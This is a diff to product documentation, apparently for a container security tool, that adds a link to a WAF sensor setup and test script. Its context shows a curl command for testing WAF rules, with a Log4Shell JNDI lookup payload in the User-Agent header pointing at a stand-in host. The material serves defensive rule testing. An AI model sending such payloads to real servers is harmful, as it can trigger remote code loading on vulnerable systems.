@@ -93,6 +93,10 @@ Using curl to POST data to server(container) can help to test WAF rule:
 curl  -X POST -k  -H "X-Auth-Token: $_TOKEN_" -H "Content-Type: application/json" -H "User-Agent: ${jndi:ldap://enq0u7nftpr.m.example.com:80/cf-198-41-223-33.cloudflare.com.gu}" -d '$SOME_DATA' "http://$SOME_IP_:$PORT"
 ```
 
+####WAF Setup and Testing	
+The downloadable file below provides an unsupported script for creating WAF sensors via CRD and running common WAF rule tests against those sensors. The README provides instructions for running it.
+[Download](waf_test.tgz)
+
 #### Sample Alerts
 
 DLP match in Discover or Monitor Mode
